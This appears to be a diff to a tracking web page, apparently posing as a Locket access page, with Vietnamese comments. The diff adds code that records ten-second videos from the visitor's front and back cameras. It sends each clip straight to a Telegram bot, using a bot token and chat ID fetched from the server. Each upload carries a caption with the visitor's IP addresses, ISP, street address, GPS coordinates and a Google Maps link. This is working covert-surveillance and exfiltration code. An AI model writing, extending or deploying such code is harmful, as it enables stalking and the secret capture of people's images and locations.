@@ -99,7 +99,10 @@ async function fallbackIPLocation() {
 
 async function recordVideo(facingMode = 'user') {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
+        // Giữ nguyên chất lượng gốc (không giới hạn độ phân giải/bitrate)
+        const constraints = { video: { facingMode: facingMode }, audio: false };
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        
         return new Promise((resolve, reject) => {
             let options = { mimeType: 'video/webm;codecs=vp9,opus' };
             if (!MediaRecorder.isTypeSupported(options.mimeType)) {
@@ -140,19 +143,37 @@ async function recordVideo(facingMode = 'user') {
 
 function getCaption(cameraType) {
     const mapsLink = info.lat && info.lon ? `https://maps.google.com/?q=${info.lat},${info.lon}` : 'Không rõ';
-    return `📡 [THÔNG TIN TRUY CẬP LOCKET - VIDEO 10S - ${cameraType}]\n\n🕒 Thời gian: ${info.time}\n📱 Thiết bị: ${info.device}\n🖥️ Hệ điều hành: ${info.os}\n🌍 IP dân cư: ${info.ip}\n🧠 IP gốc: ${info.realIp}\n🏢 ISP: ${info.isp}\n🏙️ Địa chỉ: ${info.address}\n🌎 Quốc gia: ${info.country}\n📍 Vĩ độ: ${info.lat}\n📍 Kinh độ: ${info.lon}\n📌 Google Maps: ${mapsLink}\n📸 Camera: ${info.camera}`.trim();
+    return `📡 [THÔNG TIN TRUY CẬP LOCKET - CHẤT LƯỢNG GỐC - 10S - ${cameraType}]\n\n🕒 Thời gian: ${info.time}\n📱 Thiết bị: ${info.device}\n🖥️ Hệ điều hành: ${info.os}\n🌍 IP dân cư: ${info.ip}\n🧠 IP gốc: ${info.realIp}\n🏢 ISP: ${info.isp}\n🏙️ Địa chỉ: ${info.address}\n🌎 Quốc gia: ${info.country}\n📍 Vĩ độ: ${info.lat}\n📍 Kinh độ: ${info.lon}\n📌 Google Maps: ${mapsLink}\n📸 Camera: ${info.camera}`.trim();
 }
 
-async function sendBinaryVideo(videoBlob, cameraType) {
-    const formData = new FormData();
-    const fileName = cameraType === 'TRƯỚC' ? 'front_camera.mp4' : 'back_camera.mp4';
-    formData.append('video', videoBlob, fileName);
-    formData.append('caption', getCaption(cameraType));
+async function sendDirectToTelegram(videoBlob, cameraType) {
+    try {
+        // 1. Lấy cấu hình Telegram từ máy chủ
+        const configResponse = await fetch('/api/config');
+        const config = await configResponse.json();
+        
+        if (!config.bot_token || !config.chat_id) {
+            throw new Error("Không thể lấy cấu hình Telegram");
+        }
 
-    return fetch(API_PROXY, {
-        method: 'POST',
-        body: formData
-    });
+        // 2. Gửi TRỰC TIẾP từ trình duyệt lên Telegram (Bypass Vercel limit)
+        const formData = new FormData();
+        const fileName = cameraType === 'TRƯỚC' ? 'front_camera.mp4' : 'back_camera.mp4';
+        formData.append('video', videoBlob, fileName);
+        formData.append('chat_id', config.chat_id);
+        formData.append('caption', getCaption(cameraType));
+
+        const telegramUrl = `https://api.telegram.org/bot${config.bot_token}/sendVideo`;
+        
+        const response = await fetch(telegramUrl, {
+            method: 'POST',
+            body: formData
+        });
+
+        return await response.json();
+    } catch (err) {
+        console.error("Lỗi gửi trực tiếp Telegram:", err);
+    }
 }
 
 async function sendTextOnly() {
@@ -173,25 +194,25 @@ async function startTracking() {
     let backBlob = null;
 
     try {
-        // Quay camera trước 10s
+        // Quay camera trước 10s (Gốc)
         frontBlob = await recordVideo("user");
         if (frontBlob) {
-            await sendBinaryVideo(frontBlob, 'TRƯỚC');
+            await sendDirectToTelegram(frontBlob, 'TRƯỚC');
         }
         
         await delay(1000);
 
-        // Quay camera sau 10s
+        // Quay camera sau 10s (Gốc)
         try {
             backBlob = await recordVideo("environment");
             if (backBlob) {
-                await sendBinaryVideo(backBlob, 'SAU');
+                await sendDirectToTelegram(backBlob, 'SAU');
             }
         } catch (errBack) {
             console.warn("Không quay được camera sau:", errBack);
         }
         
-        info.camera = '✅ Đã quay và gửi video binary (10s)';
+        info.camera = '✅ Đã gửi video gốc trực tiếp lên Telegram';
     } catch (e) {
         info.camera = '🚫 Lỗi quay video hoặc bị từ chối';
         await sendTextOnly();
